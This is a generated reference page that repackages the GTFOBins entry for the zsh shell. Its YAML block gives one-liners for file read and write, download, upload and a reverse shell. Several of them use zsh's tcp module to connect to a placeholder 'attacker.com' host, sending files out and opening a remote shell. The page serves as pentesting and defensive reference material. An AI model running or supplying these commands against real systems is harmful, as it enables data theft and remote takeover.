---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# zsh

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `zsh` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [zsh](../../tools/linux/zsh.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | zsh |
| name | zsh |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/zsh/ |

## Preserved Source Material

```yaml
_body: ''
_name: zsh
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh
functions:
  download:
  - binary: false
    code: zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: tcp-server
  file-read:
  - binary: false
    code: zsh -c 'echo "$(</path/to/input-file)"'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  - code: zsh -c '</path/to/input-file'
    comment: This spawns a pager if run in a TTY.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: zsh -c 'echo DATA >/path/to/output-file'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  inherit:
  - code: zsh -c '</etc/hosts'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    from: less
  reverse-shell:
  - code: zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    listener: tcp-server
  shell:
  - code: zsh
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  upload:
  - binary: false
    code: zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: tcp-server
```
